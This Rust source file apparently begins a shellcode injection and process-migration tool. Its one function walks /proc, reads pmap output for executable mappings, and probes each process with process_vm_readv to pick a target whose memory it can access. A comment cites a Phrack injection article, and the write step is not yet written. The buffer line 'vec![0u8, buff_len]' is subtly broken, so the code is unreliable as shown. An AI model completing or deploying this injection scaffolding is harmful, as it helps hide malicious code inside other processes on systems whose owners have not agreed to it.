extern crate nix;
use nix::sys::uio::{IoVec, process_vm_readv, process_vm_writev, RemoteIoVec};
use nix::unistd::Pid;
use std::process::{self, Command};

pub fn inject_and_migrate(shellcode: &[u8]) {
    println!("Shellcode len: {}", shellcode.len());
    let mut target_pid = 0;
    let list_pids = Command::new("ls")
            .arg("/proc/")
            .output()
            .unwrap();
    let mut pids: Vec<i32> = String::from_utf8(list_pids.stdout)
                                                        .unwrap()
                                                        .split('\n')
                                                        .flat_map(|s| s.parse().ok())
                                                        .collect();
    pids.retain(|i| *i != 1);
    pids.retain(|i| *i != process::id() as i32);
    for pid in pids.iter() {
        let pmap = Command::new("pmap")
                    .arg(pid.to_string())
                    .output()
                    .unwrap();
        let r_x_addresses: Vec<String> = String::from_utf8(pmap.stdout)
                                                .unwrap()
                                                .split('\n')
                                                .filter(|s| s.contains("r-x"))
                                                .map(|s| s.to_string())
                                                .collect();
        if r_x_addresses.is_empty() {
            continue;
        }
        let addr = r_x_addresses[0]
                        .split(' ')
                        .collect::<Vec<&str>>()[0];
        let addr = usize::from_str_radix(addr, 16).unwrap();
        
        let buff_len = 8;
        let mut read_buff = vec![0u8, buff_len];
        let local = &[IoVec::from_mut_slice(&mut read_buff)];
        let remote = &[RemoteIoVec{base: addr as usize, len: buff_len as usize}];
        let read_result = process_vm_readv(Pid::from_raw(*pid), local, remote);
        if read_result.is_ok() {
            target_pid = *pid;
            break;
        }
    }
    if target_pid == 0 {
        panic!("Could not find a process to whose memory can be manipulated");
    }
    println!("{:?}", target_pid);
    // Try http://phrack.org/issues/59/12.html but with https://man7.org/linux/man-pages/man2/process_vm_readv.2.html
}
